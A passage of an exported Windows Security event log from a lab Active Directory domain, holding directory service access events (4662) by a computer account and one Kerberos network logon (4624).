			{bf967a76-0de6-11d0-a285-00aa003049e2}
			{f30e3bc0-9ff0-11d1-b603-0000f80367c1}
			{f30e3bc1-9ff0-11d1-b603-0000f80367c1}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
			{42a75fc6-783f-11d2-9916-0000f87a57d4}
			{7bd4c7a6-1add-4436-8c04-3999a880154c}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e5-0de6-11d0-a285-00aa003049e2}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967953-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{bf967a76-0de6-11d0-a285-00aa003049e2}
			{f30e3bc0-9ff0-11d1-b603-0000f80367c1}
			{f30e3bc1-9ff0-11d1-b603-0000f80367c1}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
			{42a75fc6-783f-11d2-9916-0000f87a57d4}
			{7bd4c7a6-1add-4436-8c04-3999a880154c}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109634	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.809"	"thC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		READ_CONTROL
				
	Access Mask:		0x20000
	Properties:		READ_CONTROL
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%1538
				"	0x20000	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%1538
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109633	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.809"	"tRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109632	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.809"	"tBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e5-0de6-11d0-a285-00aa003049e2}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967953-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{bf967a76-0de6-11d0-a285-00aa003049e2}
			{f30e3bc0-9ff0-11d1-b603-0000f80367c1}
			{f30e3bc1-9ff0-11d1-b603-0000f80367c1}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
			{42a75fc6-783f-11d2-9916-0000f87a57d4}
			{7bd4c7a6-1add-4436-8c04-3999a880154c}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e5-0de6-11d0-a285-00aa003049e2}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967953-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{bf967a76-0de6-11d0-a285-00aa003049e2}
			{f30e3bc0-9ff0-11d1-b603-0000f80367c1}
			{f30e3bc1-9ff0-11d1-b603-0000f80367c1}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
			{42a75fc6-783f-11d2-9916-0000f87a57d4}
			{7bd4c7a6-1add-4436-8c04-3999a880154c}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109631	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.809"	"sxC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		READ_CONTROL
				
	Access Mask:		0x20000
	Properties:		READ_CONTROL
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%1538
				"	0x20000	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%1538
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109630	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.809"	"shC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{d659c65a-90e5-4db1-882a-66fb7e09695c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{d659c65a-90e5-4db1-882a-66fb7e09695c}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109629	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.809"	"sRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109628	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.808"	"sBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x63D46F
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.251
	Source Port:		50461

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.251"	50461	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x63d46f	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109626	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:58:10.807"	"rxC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{f30e3bbe-9ff0-11d1-b603-0000f80367c1}
			{f30e3bbf-9ff0-11d1-b603-0000f80367c1}
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{f30e3bbe-9ff0-11d1-b603-0000f80367c1}
			{f30e3bbf-9ff0-11d1-b603-0000f80367c1}
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109622	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.807"	"rhC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109621	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.807"	"rRC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x63d296	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109620	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:10.807"	"rBC8b54ByrYY_kgLwO2Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:11.746"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x63D296

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{f30e3bbe-9ff0-11d1-b603-0000f80367c1}
			{f30e3bbf-9ff0-11d1-b603-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{f30e3bbe-9ff0-11d1-b603-0000f80367c1}
			{f30e3bbf-9ff0-11d1-b603-0000f80367c1}
